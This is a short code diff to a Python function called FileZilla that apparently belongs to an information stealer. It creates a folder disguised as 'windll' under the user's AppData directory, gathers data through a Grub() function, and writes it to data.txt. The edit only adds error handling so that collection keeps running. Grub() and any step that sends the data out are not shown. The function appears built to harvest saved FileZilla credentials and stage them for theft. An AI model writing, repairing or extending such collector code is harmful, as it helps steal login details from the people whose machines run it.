@@ -76,7 +76,10 @@ def FileZilla() -> None:
     print("FileZilla")
     pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
     path = rf'{pathtofile}\windll\Files\FileZilla'
-    os.makedirs(path)
+    try:
+        os.makedirs(path)
+    except Exception as e:
+        print(e)
     data = Grub()
     try:
         with open(rf"{path}\data.txt", "w", encoding="utf-8") as f:
